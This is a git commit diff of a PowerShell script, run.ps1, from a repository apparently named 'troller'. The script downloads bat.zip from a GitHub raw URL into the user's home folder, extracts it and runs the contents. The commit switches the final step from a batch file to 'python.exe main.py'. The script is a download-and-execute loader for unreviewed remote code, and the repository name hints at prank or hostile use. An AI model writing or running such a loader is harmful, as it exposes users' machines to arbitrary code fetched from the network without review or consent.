314ecf685acbc8a01cce0bc5d6e289e9e0fbab59
boatinalamp <93244703+boatinalamp@users.noreply.github.com>
2023-04-10 21:31:01 +0530

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -2,4 +2,4 @@ cd $home
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/boatinalamp/troller/main/bat.zip" -OutFile "bat.zip"
 Expand-Archive bat.zip -DestinationPath bat
 cd bat\bat
-.\source.bat
+python.exe main.py
